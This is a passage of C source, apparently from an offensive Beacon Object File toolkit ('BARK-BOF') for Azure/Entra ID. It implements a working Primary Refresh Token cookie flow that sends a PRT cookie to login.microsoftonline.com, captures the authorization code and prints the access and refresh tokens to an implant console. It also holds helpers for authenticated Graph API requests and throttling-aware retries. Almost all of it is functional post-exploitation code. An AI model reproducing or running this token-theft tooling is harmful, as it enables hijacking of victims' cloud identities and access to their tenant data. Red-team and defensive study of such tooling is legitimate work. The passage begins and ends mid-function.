                    "[*] HTTP %lu — retrying in %lu seconds (attempt %d/%d)\n",
                    st, sleepSec, retry + 1, maxRetries);
            HFree(resp);
            KERNEL32$Sleep(sleepSec * 1000);
            BarkAtomicIncrement(&BarkHttpRetryCount);
            retry++;
        } else {
            if (!BarkHttpQuiet)
                BeaconPrintf(CALLBACK_OUTPUT,
                    "[!] HTTP %lu — max retries exhausted\n", st);
            break;
        }
    }
    return resp;
}

/* ================================================================
 * PRT / auth-code flow helpers (shared by token-acquisition BOFs)
 * ================================================================ */

/* WinHTTP redirect-policy constants not always pulled in by winhttp.h */
#ifndef WINHTTP_OPTION_REDIRECT_POLICY
#define WINHTTP_OPTION_REDIRECT_POLICY       88
#endif
#ifndef WINHTTP_OPTION_REDIRECT_POLICY_NEVER
#define WINHTTP_OPTION_REDIRECT_POLICY_NEVER 0
#endif
#ifndef WINHTTP_QUERY_LOCATION
#define WINHTTP_QUERY_LOCATION               33
#endif

/* ================================================================
 * Base64url alphabet
 * ================================================================ */
static const char b64chars[] =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

/* ================================================================
 * Base64UrlDecode
 * Decode a base64url string into raw bytes.
 * dst is NUL-terminated.  Returns number of bytes written, 0 on error.
 * ================================================================ */
static int Base64UrlDecode(const char *src, int srcLen, char *dst, int dstLen)
{
    char         *tmp;
    int           i, k, outLen = 0, srcIdx = 0, totalSrc, pad;
    unsigned char c0, c1, c2, c3;

    tmp = (char *)HAlloc((SIZE_T)(srcLen + 4));
    if (!tmp) return 0;

    for (i = 0; i < srcLen; i++) {
        if      (src[i] == '-') tmp[i] = '+';
        else if (src[i] == '_') tmp[i] = '/';
        else                    tmp[i] = src[i];
    }
    pad = (4 - (srcLen % 4)) % 4;
    for (i = 0; i < pad; i++) tmp[srcLen + i] = '=';
    tmp[srcLen + pad] = '\0';
    totalSrc = srcLen + pad;

    while (srcIdx + 3 < totalSrc && outLen < dstLen - 1) {
        c0 = 0; c1 = 0; c2 = 0; c3 = 0;
        for (k = 0; b64chars[k]; k++) { if (tmp[srcIdx+0] == b64chars[k]) c0 = (unsigned char)k; }
        for (k = 0; b64chars[k]; k++) { if (tmp[srcIdx+1] == b64chars[k]) c1 = (unsigned char)k; }
        if (tmp[srcIdx+2] != '=')
            for (k = 0; b64chars[k]; k++) { if (tmp[srcIdx+2] == b64chars[k]) c2 = (unsigned char)k; }
        if (tmp[srcIdx+3] != '=')
            for (k = 0; b64chars[k]; k++) { if (tmp[srcIdx+3] == b64chars[k]) c3 = (unsigned char)k; }

        if (outLen < dstLen - 1) dst[outLen++] = (char)((c0 << 2) | (c1 >> 4));
        if (tmp[srcIdx+2] != '=' && outLen < dstLen - 1)
            dst[outLen++] = (char)((c1 << 4) | (c2 >> 2));
        if (tmp[srcIdx+3] != '=' && outLen < dstLen - 1)
            dst[outLen++] = (char)((c2 << 6) | c3);
        srcIdx += 4;
    }
    dst[outLen] = '\0';
    HFree(tmp);
    return outLen;
}

/* ================================================================
 * ExtractJsonStr
 * Pull a JSON string value for a given key from a compact JSON object.
 * Returns 1 on success, 0 if the key is not found or dst is too small.
 * ================================================================ */
static int ExtractJsonStr(const char *json, const char *key,
                          char *dst, int dstLen)
{
    char  needle[128];
    char *p, *end;
    int   len;

    MSVCRT$sprintf_s(needle, sizeof(needle), "\"%s\"", key);
    p = MSVCRT$strstr(json, needle);
    if (!p) return 0;
    p += MSVCRT$strlen(needle);
    while (*p == ' ' || *p == '\t' || *p == ':') p++;
    if (*p != '"') return 0;
    p++;                               /* skip opening '"' */
    end = p;
    while (*end && *end != '"') end++;
    len = (int)(end - p);
    if (len <= 0 || len >= dstLen) return 0;
    MSVCRT$strncpy(dst, p, (size_t)len);
    dst[len] = '\0';
    return 1;
}

/* ================================================================
 * BarkExtractTidFromJWT
 *
 * Decode the payload of a JWT access token and return a heap-allocated
 * copy of the `tid` (tenant ID) claim.  Returns NULL on failure.
 * Caller must HFree the result.
 * ================================================================ */
static char *BarkExtractTidFromJWT(const char *token) {
    if (!token) return NULL;
    const char *dot1 = MSVCRT$strstr(token, ".");
    if (!dot1) return NULL;
    const char *dot2 = MSVCRT$strstr(dot1 + 1, ".");
    if (!dot2) return NULL;

    int payLen = (int)(dot2 - (dot1 + 1));
    if (payLen <= 0) return NULL;

    char *decoded = (char *)HAlloc((SIZE_T)(payLen * 2 + 8));
    if (!decoded) return NULL;

    int decLen = Base64UrlDecode(dot1 + 1, payLen, decoded, payLen * 2 + 8);
    if (decLen <= 0) { HFree(decoded); return NULL; }

    char tid[128] = {0};
    if (!ExtractJsonStr(decoded, "tid", tid, sizeof(tid))) {
        HFree(decoded);
        return NULL;
    }
    HFree(decoded);

    SIZE_T tidLen = MSVCRT$strlen(tid);
    char *result = (char *)HAlloc(tidLen + 1);
    if (!result) return NULL;
    MSVCRT$memcpy(result, tid, tidLen + 1);
    return result;
}

/* ================================================================
 * ExtractQueryParam
 * Extract a URL query-parameter value (stops at '&', '#', or '\0').
 * Returns 1 on success, 0 if the parameter is not present.
 * ================================================================ */
static int ExtractQueryParam(const char *url, const char *param,
                             char *dst, int dstLen)
{
    char  needle[128];
    char *p, *end;
    int   len;

    MSVCRT$sprintf_s(needle, sizeof(needle), "%s=", param);
    p = MSVCRT$strstr(url, needle);
    if (!p) return 0;
    p += MSVCRT$strlen(needle);
    end = p;
    while (*end && *end != '&' && *end != '#') end++;
    len = (int)(end - p);
    if (len <= 0 || len >= dstLen) return 0;
    MSVCRT$strncpy(dst, p, (size_t)len);
    dst[len] = '\0';
    return 1;
}

/* ================================================================
 * BarkGetNoRedirect
 *
 * HTTPS GET to login.microsoftonline.com with automatic redirect
 * following disabled, so the 302 Location header can be captured.
 *
 * Parameters:
 *   widePath     - wide URL path (e.g. L"/tenant/oauth2/authorize?...")
 *   extraHeaders - additional request headers as a wide string (may be NULL)
 *   outStatus    - optional: receives the HTTP status code
 *
 * Returns a heap-allocated wide string containing the Location header
 * value, or NULL on failure. Caller must free with HFree().
 * ================================================================ */
static LPWSTR BarkGetNoRedirectAttempt(LPCWSTR widePath,
                                LPCWSTR extraHeaders, DWORD *outStatus,
                                int attempt)
{
    HINTERNET hSession = NULL, hConnect = NULL, hRequest = NULL;
    LPWSTR    locBuf   = NULL;
    DWORD     locLen   = 0;
    DWORD     status   = 0;
    DWORD     statusSz = sizeof(DWORD);
    DWORD     policy   = WINHTTP_OPTION_REDIRECT_POLICY_NEVER;
    DWORD     retryAfter = 0;
    int       retryRequest = 0;

    if (outStatus) *outStatus = 0;

    BarkGraphThrottleBeforeRequest(L"login.microsoftonline.com");
    BarkAtomicIncrement(&BarkHttpRequestCount);
    hSession = WINHTTP$WinHttpOpen(
        L"BARK-BOF/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hSession) { retryRequest = attempt < 3; goto done; }

    hConnect = WINHTTP$WinHttpConnect(
        hSession, L"login.microsoftonline.com",
        INTERNET_DEFAULT_HTTPS_PORT, 0);
    if (!hConnect) { retryRequest = attempt < 3; goto done; }

    hRequest = WINHTTP$WinHttpOpenRequest(
        hConnect, L"GET", widePath, NULL,
        WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES,
        WINHTTP_FLAG_SECURE);
    if (!hRequest) { retryRequest = attempt < 3; goto done; }

    /* Prevent WinHTTP from auto-following the 302 redirect */
    WINHTTP$WinHttpSetOption(hRequest,
        WINHTTP_OPTION_REDIRECT_POLICY, &policy, sizeof(policy));

    if (extraHeaders)
        WINHTTP$WinHttpAddRequestHeaders(
            hRequest, extraHeaders, (DWORD)-1L, WINHTTP_ADDREQ_FLAG_ADD);

    if (!WINHTTP$WinHttpSendRequest(
            hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
            NULL, 0, 0, 0))
    { retryRequest = attempt < 3; goto done; }

    if (!WINHTTP$WinHttpReceiveResponse(hRequest, NULL))
    { retryRequest = attempt < 3; goto done; }

    WINHTTP$WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE_NUM,
        NULL, &status, &statusSz, NULL);
    if (outStatus) *outStatus = status;

    if (status == 429 || status >= 500) {
        WCHAR retryValue[64];
        DWORD retryValueSize = sizeof(retryValue);
        DWORD i = 0;
        if (WINHTTP$WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_RETRY_AFTER,
                NULL, retryValue, &retryValueSize, NULL)) {
            while (i < retryValueSize / sizeof(WCHAR) &&
                   retryValue[i] >= L'0' && retryValue[i] <= L'9') {
                DWORD digit = (DWORD)(retryValue[i] - L'0');
                if (retryAfter > (60 - digit) / 10) {
                    retryAfter = 60;
                    break;
                }
                retryAfter = retryAfter * 10 + digit;
                i++;
            }
        }
        if (retryAfter == 0)
            retryAfter = status == 429 ? (DWORD)((attempt + 1) * 10) :
                                         (DWORD)(2 << attempt);
        if (retryAfter > 60) retryAfter = 60;
        if (status == 429) {
            BarkAtomicIncrement(&BarkHttp429Count);
            BarkGraphThrottleAfter429(
                L"login.microsoftonline.com", retryAfter);
        }
        retryRequest = attempt < 3;
        goto done;
    }

    /* Probe for the Location header size (sets locLen to bytes needed) */
    WINHTTP$WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_LOCATION,
        NULL, NULL, &locLen, NULL);
    if (locLen == 0) goto done;

    locBuf = (LPWSTR)HAlloc(locLen + sizeof(WCHAR));
    if (!locBuf) goto done;

    WINHTTP$WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_LOCATION,
        NULL, locBuf, &locLen, NULL);

done:
    if (hRequest) WINHTTP$WinHttpCloseHandle(hRequest);
    if (hConnect) WINHTTP$WinHttpCloseHandle(hConnect);
    if (hSession) WINHTTP$WinHttpCloseHandle(hSession);
    if (retryRequest) {
        if (retryAfter == 0) retryAfter = (DWORD)(2 << attempt);
        if (retryAfter > 60) retryAfter = 60;
        BarkAtomicIncrement(&BarkHttpRetryCount);
        KERNEL32$Sleep(retryAfter * 1000);
        return BarkGetNoRedirectAttempt(
            widePath, extraHeaders, outStatus, attempt + 1);
    }
    return locBuf;
}

static LPWSTR BarkGetNoRedirect(LPCWSTR widePath, LPCWSTR extraHeaders,
                                DWORD *outStatus)
{
    return BarkGetNoRedirectAttempt(widePath, extraHeaders, outStatus, 0);
}

/* Forward declarations for functions used by BarkPRTCookieFlow but
 * defined later in this header.                                     */
static void UrlEncode(const char *src, char *dest, size_t destSize);
static void BarkTokenPost(LPCWSTR widePath, const char *formBody);

/* ================================================================
 * BarkPRTCookieFlow
 *
 * Perform the full PRT cookie -> authorization code -> access token flow.
 * Prints the resulting token JSON to the beacon console via BarkTokenPost.
 *
 * Steps:
 *   1. Decode PRT Cookie JWT to extract request_nonce
 *   2. GET /oauth2/authorize with x-ms-RefreshTokenCredential header
 *   3. POST /oauth2/token to exchange auth code for access token
 * ================================================================ */
static void BarkPRTCookieFlow(const char *prtToken, const char *resource,
                               const char *clientId, const char *tenantId,
                               const char *redirectUri)
{
    /* Stack buffers for small, bounded values */
    char   nonce[256]              = {0};
    static char encRedirect[2048]  = {0};
    static char code[4096]         = {0};
    static char encCode[8192]      = {0};
    static char pathBuf[4096]      = {0};
    static char hdrBuf[8192]       = {0};

    /* Heap allocations for variable-length or large buffers */
    char  *decoded       = NULL;
    char  *locNarrow     = NULL;
    char  *bodyBuf       = NULL;
    LPWSTR widePath      = NULL;
    LPWSTR hdrWide       = NULL;
    LPWSTR wideTokenPath = NULL;
    LPWSTR wideLocation  = NULL;

    char  *dot1 = NULL, *dot2 = NULL, *payload = NULL;
    int    payLen = 0;
    DWORD  status = 0;

    /* ----------------------------------------------------------------
     * Step 1 -- Decode JWT payload, extract request_nonce
     * ---------------------------------------------------------------- */
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Get-TokenWithPRTCookie: Step 1/3 -- decoding PRT Cookie JWT...\n");

    dot1 = MSVCRT$strstr(prtToken, ".");
    dot2 = dot1 ? MSVCRT$strstr(dot1 + 1, ".") : NULL;

    if (dot1 && dot2) {
        payload = dot1 + 1;
        payLen  = (int)(dot2 - payload);
        if (payLen > 0) {
            decoded = (char *)HAlloc((SIZE_T)(payLen * 2 + 8));
            if (decoded) {
                if (Base64UrlDecode(payload, payLen,
                                    decoded, payLen * 2 + 8) > 0) {
                    if (!ExtractJsonStr(decoded, "request_nonce",
                                        nonce, sizeof(nonce)))
                        ExtractJsonStr(decoded, "nonce",
                                       nonce, sizeof(nonce));
                }
                HFree(decoded);
                decoded = NULL;
            }
        }
    }

    if (nonce[0])
        BeaconPrintf(CALLBACK_OUTPUT,
            "[+] Nonce extracted: %s\n", nonce);
    else
        BeaconPrintf(CALLBACK_OUTPUT,
            "[!] No nonce found in JWT payload -- proceeding without sso_nonce\n");

    /* ----------------------------------------------------------------
     * Step 2 -- GET /oauth2/authorize with PRT Cookie; capture 302
     * ---------------------------------------------------------------- */
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Get-TokenWithPRTCookie: Step 2/3 -- GET /authorize...\n");

    UrlEncode(redirectUri, encRedirect, sizeof(encRedirect));

    if (nonce[0]) {
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
            "/%s/oauth2/authorize"
            "?response_type=code"
            "&client_id=%s"
            "&redirect_uri=%s"
            "&resource=%s"
            "&sso_nonce=%s",
            tenantId, clientId, encRedirect, resource, nonce);
    } else {
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
            "/%s/oauth2/authorize"
            "?response_type=code"
            "&client_id=%s"
            "&redirect_uri=%s"
            "&resource=%s",
            tenantId, clientId, encRedirect, resource);
    }

    widePath = MbsToWcs(pathBuf);
    if (!widePath) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n");
        return;
    }

    MSVCRT$sprintf_s(hdrBuf, sizeof(hdrBuf),
        "x-ms-RefreshTokenCredential: %s\r\n", prtToken);
    hdrWide = MbsToWcs(hdrBuf);
    if (!hdrWide) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Header conversion failed\n");
        HFree(widePath);
        return;
    }

    wideLocation = BarkGetNoRedirect(widePath, hdrWide, &status);
    HFree(widePath);  widePath = NULL;
    HFree(hdrWide);   hdrWide  = NULL;

    if (!wideLocation) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Step 2 failed: no Location header returned (HTTP %lu)\n"
            "    Verify the PRT Cookie is valid and not expired.\n", status);
        return;
    }

    /* Convert wide Location to narrow UTF-8 for parsing */
    locNarrow = (char *)HAlloc(16384);
    if (!locNarrow) {
        HFree(wideLocation);
        BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed\n");
        return;
    }
    KERNEL32$WideCharToMultiByte(
        CP_UTF8, 0, wideLocation, -1,
        locNarrow, 16383, NULL, NULL);
    HFree(wideLocation);  wideLocation = NULL;

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Redirect captured (HTTP %lu)\n", status);

    /* Check for an error parameter before looking for the code */
    {
        char errVal[256]   = {0};
        static char errDesc[1024] = {0};
        if (ExtractQueryParam(locNarrow, "error", errVal, sizeof(errVal))) {
            ExtractQueryParam(locNarrow, "error_description",
                              errDesc, sizeof(errDesc));
            BeaconPrintf(CALLBACK_ERROR,
                "[-] Authorize endpoint returned error: %s\n    %s\n",
                errVal, errDesc);
            HFree(locNarrow);
            return;
        }
    }

    if (!ExtractQueryParam(locNarrow, "code", code, sizeof(code))) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] Step 2 failed: no 'code' in redirect URL:\n"
            "    %s\n", locNarrow);
        HFree(locNarrow);
        return;
    }
    HFree(locNarrow);  locNarrow = NULL;

    BeaconPrintf(CALLBACK_OUTPUT,
        "[+] Authorization code received (%d chars)\n",
        (int)MSVCRT$strlen(code));

    /* ----------------------------------------------------------------
     * Step 3 -- POST /oauth2/token to exchange code for access token
     * ---------------------------------------------------------------- */
    BeaconPrintf(CALLBACK_OUTPUT,
        "[*] Get-TokenWithPRTCookie: Step 3/3 -- exchanging code for token...\n");

    UrlEncode(code, encCode, sizeof(encCode));

    wideTokenPath = MbsToWcs("/common/oauth2/token");
    if (!wideTokenPath) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Token path conversion failed\n");
        return;
    }

    bodyBuf = (char *)HAlloc(16384);
    if (!bodyBuf) {
        HFree(wideTokenPath);
        BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed\n");
        return;
    }

    MSVCRT$sprintf_s(bodyBuf, 16384,
        "grant_type=authorization_code"
        "&client_id=%s"
        "&redirect_uri=%s"
        "&code=%s",
        clientId, encRedirect, encCode);

    BarkTokenPost(wideTokenPath, bodyBuf);

    HFree(wideTokenPath);  wideTokenPath = NULL;
    HFree(bodyBuf);        bodyBuf       = NULL;
}

/* Forward declaration — defined after BarkTokenPost below */
static int BarkTokenPostTry(LPCWSTR widePath, const char *formBody, int quiet);

/* ================================================================
 * BarkPRTCookieFlowTry
 *
 * Like BarkPRTCookieFlow but returns 1 on success, 0 on failure.
 * When quiet==1, error output is suppressed (used for multi-clientId
 * fallback loops where failures on most attempts are expected).
 * ================================================================ */
static int BarkPRTCookieFlowTry(const char *prtToken, const char *resource,
                                  const char *clientId, const char *tenantId,
                                  const char *redirectUri, int quiet)
{
    char   nonce[256]              = {0};
    static char encRedirect[2048]  = {0};
    static char code[4096]         = {0};
    static char encCode[8192]      = {0};
    static char pathBuf[4096]      = {0};
    static char hdrBuf[8192]       = {0};

    char  *decoded       = NULL;
    char  *locNarrow     = NULL;
    char  *bodyBuf       = NULL;
    LPWSTR widePath      = NULL;
    LPWSTR hdrWide       = NULL;
    LPWSTR wideTokenPath = NULL;
    LPWSTR wideLocation  = NULL;

    char  *dot1 = NULL, *dot2 = NULL, *payload = NULL;
    int    payLen = 0;
    DWORD  status = 0;

    /* Step 1 -- Decode JWT payload, extract request_nonce */
    dot1 = MSVCRT$strstr(prtToken, ".");
    dot2 = dot1 ? MSVCRT$strstr(dot1 + 1, ".") : NULL;

    if (dot1 && dot2) {
        payload = dot1 + 1;
        payLen  = (int)(dot2 - payload);
        if (payLen > 0) {
            decoded = (char *)HAlloc((SIZE_T)(payLen * 2 + 8));
            if (decoded) {
                if (Base64UrlDecode(payload, payLen,
                                    decoded, payLen * 2 + 8) > 0) {
                    if (!ExtractJsonStr(decoded, "request_nonce",
                                        nonce, sizeof(nonce)))
                        ExtractJsonStr(decoded, "nonce",
                                       nonce, sizeof(nonce));
                }
                HFree(decoded);
                decoded = NULL;
            }
        }
    }

    /* Step 2 -- GET /oauth2/authorize with PRT Cookie; capture 302 */
    UrlEncode(redirectUri, encRedirect, sizeof(encRedirect));

    if (nonce[0]) {
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
            "/%s/oauth2/authorize"
            "?response_type=code"
            "&client_id=%s"
            "&redirect_uri=%s"
            "&resource=%s"
            "&sso_nonce=%s",
            tenantId, clientId, encRedirect, resource, nonce);
    } else {
        MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf),
            "/%s/oauth2/authorize"
            "?response_type=code"
            "&client_id=%s"
            "&redirect_uri=%s"
            "&resource=%s",
            tenantId, clientId, encRedirect, resource);
    }

    widePath = MbsToWcs(pathBuf);
    if (!widePath) {
        if (!quiet)
            BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n");
        return 0;
    }

    MSVCRT$sprintf_s(hdrBuf, sizeof(hdrBuf),
        "x-ms-RefreshTokenCredential: %s\r\n", prtToken);
    hdrWide = MbsToWcs(hdrBuf);
    if (!hdrWide) {
        if (!quiet)
            BeaconPrintf(CALLBACK_ERROR, "[-] Header conversion failed\n");
        HFree(widePath);
        return 0;
    }

    wideLocation = BarkGetNoRedirect(widePath, hdrWide, &status);
    HFree(widePath);  widePath = NULL;
    HFree(hdrWide);   hdrWide  = NULL;

    if (!wideLocation) {
        if (!quiet)
            BeaconPrintf(CALLBACK_ERROR,
                "[-] Step 2 failed: no Location header returned (HTTP %lu)\n"
                "    Verify the PRT Cookie is valid and not expired.\n", status);
        return 0;
    }

    locNarrow = (char *)HAlloc(16384);
    if (!locNarrow) {
        HFree(wideLocation);
        if (!quiet)
            BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed\n");
        return 0;
    }
    KERNEL32$WideCharToMultiByte(
        CP_UTF8, 0, wideLocation, -1,
        locNarrow, 16383, NULL, NULL);
    HFree(wideLocation);  wideLocation = NULL;

    {
        char errVal[256]        = {0};
        static char errDesc[1024] = {0};
        if (ExtractQueryParam(locNarrow, "error", errVal, sizeof(errVal))) {
            if (!quiet) {
                ExtractQueryParam(locNarrow, "error_description",
                                  errDesc, sizeof(errDesc));
                BeaconPrintf(CALLBACK_ERROR,
                    "[-] Authorize endpoint returned error: %s\n    %s\n",
                    errVal, errDesc);
            }
            HFree(locNarrow);
            return 0;
        }
    }

    if (!ExtractQueryParam(locNarrow, "code", code, sizeof(code))) {
        if (!quiet)
            BeaconPrintf(CALLBACK_ERROR,
                "[-] Step 2 failed: no 'code' in redirect URL:\n"
                "    %s\n", locNarrow);
        HFree(locNarrow);
        return 0;
    }
    HFree(locNarrow);  locNarrow = NULL;

    /* Step 3 -- POST /oauth2/token to exchange code for access token */
    UrlEncode(code, encCode, sizeof(encCode));

    wideTokenPath = MbsToWcs("/common/oauth2/token");
    if (!wideTokenPath) {
        if (!quiet)
            BeaconPrintf(CALLBACK_ERROR, "[-] Token path conversion failed\n");
        return 0;
    }

    bodyBuf = (char *)HAlloc(16384);
    if (!bodyBuf) {
        HFree(wideTokenPath);
        if (!quiet)
            BeaconPrintf(CALLBACK_ERROR, "[-] Memory allocation failed\n");
        return 0;
    }

    MSVCRT$sprintf_s(bodyBuf, 16384,
        "grant_type=authorization_code"
        "&client_id=%s"
        "&redirect_uri=%s"
        "&code=%s",
        clientId, encRedirect, encCode);

    int ok = BarkTokenPostTry(wideTokenPath, bodyBuf, quiet);

    HFree(wideTokenPath);  wideTokenPath = NULL;
    HFree(bodyBuf);        bodyBuf       = NULL;
    return ok;
}

/* ================================================================
 * BarkGet
 *
 * Perform an authenticated HTTPS GET and print the JSON response.
 *
 * Parameters:
 *   host        - wide hostname  (e.g. L"graph.microsoft.com")
 *   widePath    - wide URL path  (e.g. L"/v1.0/users")
 *   bearerToken - narrow Bearer token string
 * ================================================================ */
static char *JsonExtractNextLink(const char *start, const char *end);
static LPWSTR BarkResolveNextLink(const char *nextUrl, LPCWSTR host, const char *tenantBase);
static char *JsonExtractStringValue(const char *obj, const char *objEnd,
                                    const char *keyWithQuotes);

/* Build an Authorization header with dynamic allocation so tokens of any
 * length are handled.  Returns a wide string the caller must HFree.
 * extraHeaders (e.g. "ConsistencyLevel: eventual\r\n") is appended as-is;
 * pass NULL or "" if not needed.  If bearerToken is NULL or empty the
 * Authorization line is omitted (used by BarkPost for unauthenticated
 * requests). */
static LPWSTR BarkMakeAuthHeader(const char *bearerToken,
                                  const char *extraHeaders) {
    SIZE_T tokenLen = (bearerToken && bearerToken[0]) ? MSVCRT$strlen(bearerToken) : 0;
    SIZE_T extraLen = extraHeaders ? MSVCRT$strlen(extraHeaders) : 0;
    SIZE_T needed = 22 + tokenLen + 2 + extraLen + 1;
    char *buf = (char *)HAlloc(needed);
    if (!buf) return NULL;
    if (tokenLen > 0)
        MSVCRT$sprintf_s(buf, (int)needed,
            "Authorization: Bearer %s\r\n%s",
            bearerToken, extraHeaders ? extraHeaders : "");
    else if (extraLen > 0)
        MSVCRT$sprintf_s(buf, (int)needed, "%s", extraHeaders);
    else
        buf[0] = '\0';
    LPWSTR wide = MbsToWcs(buf);
    HFree(buf);
    return wide;
}

static void BarkGet(LPCWSTR host, LPCWSTR widePath, const char *bearerToken) {
    DWORD  status  = 0;

    LPWSTR hdrWide = BarkMakeAuthHeader(bearerToken, "ConsistencyLevel: eventual\r\n");
    if (!hdrWide) {
        BeaconPrintf(CALLBACK_ERROR, "[-] BarkGet: header conversion failed\n");
        return;
    }

    char tenantBase[64] = "";
    if (widePath && widePath[0] == L'/') {
        int i, end = -1;
        for (i = 1; widePath[i] && i < 60; i++) {
            if (widePath[i] == L'/') { end = i; break; }
        }
        if (end > 0) {
            for (i = 0; i <= end; i++) tenantBase[i] = (char)widePath[i];
            tenantBase[end + 1] = '\0';
        }
    }

    LPCWSTR pathArg = widePath;
    char  *nextUrl  = NULL;
    LPWSTR nextWide = NULL;
    int    page     = 0;

    while (1) {
        char *resp = HttpRequestWithRetry(L"GET", host, pathArg,
            hdrWide, NULL, 0, &status);

        if (nextUrl)  { HFree(nextUrl);  nextUrl  = NULL; }
        if (nextWide) { HFree(nextWide); nextWide = NULL; }

        if (!resp) {
            if (page == 0)
                BeaconPrintf(CALLBACK_ERROR,
                    "[-] BarkGet: request failed (HTTP %lu)\n", status);
            break;
        }
        if (status >= 400) {
            if (page == 0)
                BeaconPrintf(CALLBACK_ERROR,
                    "[-] BarkGet: HTTP %lu:\n    %s\n", status, resp);
            HFree(resp);
            break;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "%s\n", resp);
        page++;

        SIZE_T respLen = MSVCRT$strlen(resp);
        nextUrl = JsonExtractNextLink(resp, resp + respLen);
        HFree(resp);
        if (!nextUrl) break;

        nextWide = BarkResolveNextLink(nextUrl, host, tenantBase);
        if (!nextWide) break;
        pathArg = nextWide;
    }

    HFree(hdrWide);
    if (nextUrl)  HFree(nextUrl);
    if (nextWide) HFree(nextWide);
}

/* ================================================================
 * BarkPost
 *
 * Perform an authenticated HTTPS POST/PATCH/PUT/DELETE and print
 * the JSON response.
 *
 * Parameters:
 *   host        - wide hostname
 *   widePath    - wide URL path
 *   method      - wide HTTP method (L"POST", L"PATCH", L"PUT", etc.)
 *   jsonBody    - narrow JSON/form body string (may be NULL)
 *   bearerToken - narrow Bearer token (may be NULL if no auth needed)
 *   contentType - narrow Content-Type (NULL => "application/json")
 * ================================================================ */
static void BarkPost(
    LPCWSTR host, LPCWSTR widePath, LPCWSTR method,
    const char *jsonBody, const char *bearerToken, const char *contentType)
{
    char  *resp    = NULL;
    DWORD  status  = 0;
    DWORD  bodyLen = 0;
    const char *ct = contentType ? contentType : "application/json";

    char ctHdr[256];
    MSVCRT$sprintf_s(ctHdr, sizeof(ctHdr), "Content-Type: %s\r\n", ct);
    LPWSTR hdrWide = BarkMakeAuthHeader(bearerToken, ctHdr);
    if (!hdrWide) {
        BeaconPrintf(CALLBACK_ERROR, "[-] BarkPost: header conversion failed\n");
        return;
    }

    bodyLen = jsonBody ? (DWORD)MSVCRT$strlen(jsonBody) : 0;
    resp    = HttpRequest(method, host, widePath, hdrWide,
                          jsonBody, bodyLen, &status);
    HFree(hdrWide);

    if (resp) {
        BeaconPrintf(CALLBACK_OUTPUT, "%s\n", resp);
        HFree(resp);
    } else {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] BarkPost: request failed (HTTP %lu)\n", status);
    }
}

/* ================================================================
 * BarkTokenPost
 *
 * POST a form-encoded body to login.microsoftonline.com and print
 * the token response. Used for all OAuth token endpoints.
 *
 * Parameters:
 *   widePath - wide URL path (e.g. L"/common/oauth2/token")
 *   formBody - narrow x-www-form-urlencoded body
 * ================================================================ */
static void BarkTokenPost(LPCWSTR widePath, const char *formBody) {
    LPCWSTR hdrWide = L"Content-Type: application/x-www-form-urlencoded\r\n";
    DWORD   bodyLen = formBody ? (DWORD)MSVCRT$strlen(formBody) : 0;
    DWORD   status  = 0;
    char   *atBuf   = NULL;
    char   *rtBuf   = NULL;
    char   *nonceBuf = NULL;

    char *resp = HttpRequest(
        L"POST", L"login.microsoftonline.com", widePath,
        hdrWide, formBody, bodyLen, &status);

    if (!resp) {
        BeaconPrintf(CALLBACK_ERROR,
            "[-] BarkTokenPost: request failed (HTTP %lu)\n", status);
        return;
    }

    atBuf = (char *)HAlloc(8192);
    rtBuf = (char *)HAlloc(4096);
    nonceBuf = (char *)HAlloc(4096);

    if (nonceBuf && ExtractJsonStr(resp, "Nonce", nonceBuf, 4096)) {
        int nonceLen = (int)MSVCRT$strlen(nonceBuf);
        int outLen = 11 + nonceLen + 1;
        char *outBuf = (char *)HAlloc(outLen + 1);
        if (outBuf) {
            MSVCRT$memcpy(outBuf, "[+] Nonce: ", 11);
            MSVCRT$memcpy(outBuf + 11, nonceBuf, nonceLen);
            outBuf[11 + nonceLen] = '\n';
            BeaconOutput(CALLBACK_OUTPUT, outBuf, outLen);
            HFree(outBuf);
        }
    } else if (atBuf && ExtractJsonStr(resp, "access_token", atBuf, 8192)) {
        int atLen = (int)MSVCRT$strlen(atBuf);
        int outLen = 18 + atLen + 1;
        char *outBuf = (char *)HAlloc(outLen + 1);
        if (outBuf) {
            MSVCRT$memcpy(outBuf, "[+] access_token: ", 18);
            MSVCRT$memcpy(outBuf + 18, atBuf, atLen);
            outBuf[18 + atLen] = '\n';
            BeaconOutput(CALLBACK_OUTPUT, outBuf, outLen);
            HFree(outBuf);
        }
        if (rtBuf && ExtractJsonStr(resp, "refresh_token", rtBuf, 4096)) {
            int rtLen = (int)MSVCRT$strlen(rtBuf);
            int rtOutLen = 19 + rtLen + 1;
            char *rtOutBuf = (char *)HAlloc(rtOutLen + 1);
            if (rtOutBuf) {
                MSVCRT$memcpy(rtOutBuf, "[+] refresh_token: ", 19);
                MSVCRT$memcpy(rtOutBuf + 19, rtBuf, rtLen);
                rtOutBuf[19 + rtLen] = '\n';
                BeaconOutput(CALLBACK_OUTPUT, rtOutBuf, rtOutLen);
                HFree(rtOutBuf);
            }
        }
    } else {
        /* No access_token — probably an error response; print raw for visibility */
